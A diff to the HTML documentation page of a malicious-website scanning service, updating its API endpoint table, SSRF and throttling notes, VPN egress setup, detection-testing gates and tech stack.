+        All endpoints are under <code>/api/</code>. The API is public and unauthenticated — the React GUI is a pure
+        client of it, with no browser-only endpoints — and is documented for callers at <code>/api-docs</code>.
+      </p>
       <div class="v-wrap mb-3">
         <table class="v-table">
           <thead><tr><th>Method</th><th>Path</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td><code>POST</code></td><td><code>/api/scan/</code></td><td>Submit a URL for scanning. Returns <code>{"id": "...", "status": "PENDING"}</code>. 202 on success, 429 if rate limited.</td></tr>
-            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/</code></td><td>Poll scan status and retrieve full results once complete.</td></tr>
-            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/stream/</code></td><td>Server-Sent Events stream — events: <code>status_update</code>, <code>complete</code>, <code>error</code>. Auto-retry on disconnect (3 attempts, 2s delay).</td></tr>
-            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/source/</code></td><td>Re-fetch the raw source of a URL that belongs to a completed scan. Only permits URLs within the original scan scope.</td></tr>
-            <tr><td><code>GET</code></td><td><code>/api/history/</code></td><td>Paginated list of completed scans. Supports <code>?q=</code> URL substring filter and <code>?page=</code>.</td></tr>
+            <tr><td><code>POST</code></td><td><code>/api/scan/</code></td><td>Submit a URL for scanning. Returns <code>{"id": "...", "status": "PENDING", "submitted_via": "..."}</code>. 202 on success, 429 if throttled.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/</code></td><td>Poll scan status and retrieve full results once complete. Idempotent — reads never delete.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/stream/</code></td><td>Server-Sent Events stream — events: <code>status_update</code>, <code>complete</code>, <code>error</code>. Auto-retry on disconnect (3 attempts, 2s delay); max 6 concurrent streams per IP.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/source/</code></td><td>Re-fetch the raw source of a URL belonging to a completed scan. Allowlisted to the original scan scope — not an open proxy.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/screenshot/</code></td><td>Renderer screenshot PNG — <code>?variant=desktop|mobile</code>.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/scan/{id}/url-history/</code></td><td>Previous scans of the same URL, for comparing a verdict against what the site looked like before.</td></tr>
+            <tr><td><code>POST</code></td><td><code>/api/scan/{id}/feedback/</code></td><td>Analyst feedback — false positive / false negative / correct. One record per (scan, IP), 20/hour. The only unauthenticated write.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/history/</code></td><td>Paginated scan history, deduplicated per URL. Supports <code>?q=</code> URL substring filter and <code>?page=</code>. Failed scans are never listed.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/overview/</code></td><td>Aggregate scan statistics.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/verdicts/</code></td><td>Verdict distribution.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/findings/</code></td><td>Finding frequency by category and severity.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/technologies/</code></td><td>Technology detection frequency — add <code>/scans/</code> to drill into the scans behind a row.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/campaigns/</code></td><td>Named campaign families seen — add <code>/scans/</code> to drill down.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/stats/infrastructure/</code></td><td>Recurring attacker infrastructure — add <code>/scans/</code> to drill down.</td></tr>
             <tr><td><code>GET</code></td><td><code>/api/health/</code></td><td>Health check — returns <code>{"status":"ok"}</code>.</td></tr>
-            <tr><td><code>GET</code></td><td><code>/api/schema/swagger-ui/</code></td><td>Interactive API documentation (drf-spectacular).</td></tr>
+            <tr><td><code>GET</code></td><td><code>/api/schema/swagger-ui/</code></td><td>Interactive API documentation (drf-spectacular). Throttled — generating the schema walks every view, which makes an unthrottled endpoint a cheap CPU amplifier.</td></tr>
+            <tr><td><code>GET</code></td><td><code>/.well-known/security.txt</code></td><td>Responsible disclosure contact.</td></tr>
           </tbody>
         </table>
       </div>
       <div class="callout">
-        <strong>SSRF protection:</strong> All outbound HTTP requests made during a scan go through an SSRF-safe fetcher
-        that rejects non-HTTP(S) schemes, resolves DNS and blocks RFC1918 / loopback / link-local addresses, caps
-        response bodies at 5 MB, and enforces hard timeouts. It is not possible to use the scan endpoint to probe
-        internal network resources.
+        <strong>Throttling is anti-flood, not a usage quota.</strong> Submission is bounded by a per-IP burst cap
+        (<code>RATE_LIMIT_SCANS_PER_MINUTE</code>) plus an in-flight concurrency cap
+        (<code>MAX_CONCURRENT_SCANS_PER_IP</code>) — the two things that actually bound worker and Chromium load.
+        Ordinary use is not rate limited; floods get a <code>429</code>. The flat hourly quota is legacy and ships
+        disabled.
       </div>
+      <div class="callout">
+        <strong>SSRF protection:</strong> every outbound request made during a scan goes through an SSRF-safe fetcher.
+        It rejects non-HTTP(S) schemes and URLs over 2048 chars, resolves DNS and checks <em>every</em> resolved IP
+        against blocked networks (RFC1918, loopback, CGNAT, link-local, IPv6 private) with a <code>not is_global</code>
+        backstop, unwraps IPv4-in-IPv6 encodings before checking (v4-mapped, v4-compatible, 6to4, Teredo), caps
+        response bodies at 5 MB (external scripts at 1 MB), enforces hard timeouts, and handles redirects manually so
+        every hop is re-validated. Validation runs both before queuing and again before fetching. A regression gate
+        pins 29 must-block and 11 must-stay-reachable addresses; a case is added before the validator is touched.
+      </div>
+
+      <!-- ── VPN Egress ── -->
+      <h2 id="vpn"><i class="bi bi-shield-lock me-2" style="color:var(--accent);"></i>VPN Egress (Production)</h2>
+      <p>
+        A scanner visits attacker infrastructure all day, and every visit tells that infrastructure the scanner's IP.
+        In production, <strong>no container that touches a scan target has a route to the internet except through a VPN
+        tunnel</strong> (<a href="https://github.com/qdm12/gluetun" target="_blank">gluetun</a>, NordVPN over OpenVPN).
+      </p>
+      <div class="v-wrap mb-3">
+        <table class="v-table">
+          <thead><tr><th>Tunnel</th><th>Carries</th><th>Networks</th></tr></thead>
+          <tbody>
+            <tr><td><code>gluetun-render</code></td><td>Carapace only</td><td>render network only — the renderer still cannot reach the database or cache</td></tr>
+            <tr><td><code>gluetun-app</code></td><td>backend + celery</td><td>public, internal and render networks</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>
+        It is routing, not a proxy: there is no code path that can forget to use it, and gluetun's kill switch means a
+        dropped tunnel fails closed rather than leaking. Exits are random UK servers, and a scheduled task reconnects
+        both tunnels every 4 hours so an exit a TDS has blocklisted does not stay burned. gluetun's own
+        malicious-domain DNS blocklist is deliberately disabled — it would hide the very domains being scanned.
+      </p>
+      <pre>cp gluetun.env.sample gluetun.env      # NordVPN *service* credentials; gitignored
+bash ops/gluetun-update-servers.sh     # refresh gluetun's server list
+bash ops/gluetun-control-key.sh        # API key for exit rotation
+docker compose -f docker-compose.prod.yml up -d
+bash ops/verify-vpn-egress.sh          # prove nothing exits on the host's own IP</pre>
+      <p style="color:var(--muted); font-size:.875rem;">
+        <code>verify-vpn-egress.sh</code> checks, from inside each container, that the exit IP is not the host's, that
+        NordVPN reports the connection as protected, that DNS goes through the tunnel, and that the renderer still
+        cannot reach the database or the LAN.
+      </p>
+
+      <!-- ── Detection Testing ── -->
+      <h2 id="testing"><i class="bi bi-clipboard-check me-2" style="color:var(--accent);"></i>Detection Testing</h2>
+      <p>
+        Every change that affects scan output must pass three gates. They are deliberately adversarial to one another —
+        the edit that removes a false positive is the same edit that can silently delete a detection.
+      </p>
+      <div class="v-wrap mb-3">
+        <table class="v-table">
+          <thead><tr><th>Gate</th><th>Question it answers</th></tr></thead>
+          <tbody>
+            <tr><td><code>python backend/run_threat_regression.py</code></td><td>Detections: did a fix remove real coverage? Offline fixtures, no network.</td></tr>
+            <tr><td><code>python backend/run_clean_snapshots.py</code></td><td>False positives: are legitimate sites still CLEAN? Replays stored snapshots and never contacts those sites again.</td></tr>
+            <tr><td><code>bash ops/harness-vpn.sh run_scan_test.py --feedback</code></td><td>Cases: are reported misses and false positives actually fixed? Live scans — and they run inside the VPN namespace, refusing to start on a bare host.</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>
+        Each exits non-zero and names what broke. Fixtures are inert by construction, and new detections land with both
+        a positive fixture and the false-positive controls that bound them.
+      </p>
 
       <!-- ── Tech Stack ── -->
       <h2 id="stack"><i class="bi bi-stack me-2" style="color:var(--accent);"></i>Tech Stack</h2>
@@ -632,13 +912,17 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
         <table class="v-table">
           <thead><tr><th>Layer</th><th>Technology</th></tr></thead>
           <tbody>
-            <tr><td>Backend</td><td>Python 3.11 / Django 5.2 / Django REST Framework</td></tr>
-            <tr><td>Task queue</td><td>Celery + Redis</td></tr>
-            <tr><td>API docs</td><td>drf-spectacular — Swagger UI at <code>/api/schema/swagger-ui/</code></td></tr>
+            <tr><td>Backend</td><td>Python 3.12 / Django 5.2 / Django REST Framework</td></tr>
+            <tr><td>Task queue</td><td>Celery + Redis (worker + beat schedule)</td></tr>
+            <tr><td>Fetching</td><td>httpx (HTTP/2), curl_cffi (browser TLS-fingerprint impersonation)</td></tr>
+            <tr><td>API docs</td><td>drf-spectacular — Swagger UI at <code>/api/schema/swagger-ui/</code>, plus the public <code>/api-docs</code> page</td></tr>
             <tr><td>Frontend</td><td>React 19 / TypeScript / Vite / Tailwind CSS 4</td></tr>
             <tr><td>Database</td><td>SQLite (development) / PostgreSQL (production)</td></tr>
             <tr><td>Cache / broker</td><td>Redis</td></tr>
-            <tr><td>Visual renderer</td><td><a href="https://github.com/DanDreadless/Carapace" target="_blank">Carapace</a> — Chromium-headless screenshot service (optional sidecar)</td></tr>
+            <tr><td>ML</td><td>scikit-learn DGA classifier (lazy-loaded, heuristic fallback)</td></tr>
+            <tr><td>Renderer</td><td><a href="https://github.com/DanDreadless/Carapace" target="_blank">Carapace</a> — Rust + headless Chromium (CDP) + oxc AST + QuickJS sandbox</td></tr>
+            <tr><td>Egress</td><td><a href="https://github.com/qdm12/gluetun" target="_blank">gluetun</a> VPN tunnels (production)</td></tr>
+            <tr><td>Edge</td><td>nginx behind a Cloudflare tunnel (production)</td></tr>
           </tbody>
         </table>
       </div>
@@ -656,7 +940,12 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
         <a class="ack-pill" href="https://github.com/beaudar/jsbeautifier" target="_blank">jsbeautifier</a>
         <a class="ack-pill" href="https://www.crummy.com/software/BeautifulSoup/" target="_blank">BeautifulSoup4</a>
         <a class="ack-pill" href="https://github.com/john-kurkowski/tldextract" target="_blank">tldextract</a>
-        <a class="ack-pill" href="https://python-requests.org/" target="_blank">Requests</a>
+        <a class="ack-pill" href="https://www.python-httpx.org/" target="_blank">httpx</a>
+        <a class="ack-pill" href="https://github.com/lexiforest/curl_cffi" target="_blank">curl_cffi</a>
+        <a class="ack-pill" href="https://lxml.de/" target="_blank">lxml</a>
+        <a class="ack-pill" href="https://www.dnspython.org/" target="_blank">dnspython</a>
+        <a class="ack-pill" href="https://github.com/richardpenman/whois" target="_blank">python-whois</a>
+        <a class="ack-pill" href="https://scikit-learn.org/" target="_blank">scikit-learn</a>
         <a class="ack-pill" href="https://drf-spectacular.readthedocs.io/" target="_blank">drf-spectacular</a>
       </div>
 
@@ -677,11 +966,15 @@ docker-compose down --rmi all --volumes --remove-orphans</pre>
         <a class="ack-pill" href="https://www.postgresql.org/" target="_blank">PostgreSQL</a>
         <a class="ack-pill" href="https://gunicorn.org/" target="_blank">Gunicorn</a>
         <a class="ack-pill" href="https://www.docker.com/" target="_blank">Docker</a>
+        <a class="ack-pill" href="https://nginx.org/" target="_blank">nginx</a>
+        <a class="ack-pill" href="https://github.com/qdm12/gluetun" target="_blank">gluetun</a>
       </div>
 
       <p style="color:var(--accent); font-size:.75rem; font-weight:600; letter-spacing:.08em; text-transform:uppercase; margin-bottom:.5rem; margin-top:1.5rem;">Visual Renderer</p>
       <div class="ack-wrap">
         <a class="ack-pill" href="https://github.com/DanDreadless/Carapace" target="_blank">Carapace</a>
+        <a class="ack-pill" href="https://oxc.rs/" target="_blank">oxc</a>
+        <a class="ack-pill" href="https://bellard.org/quickjs/" target="_blank">QuickJS</a>
       </div>
 
     </main>
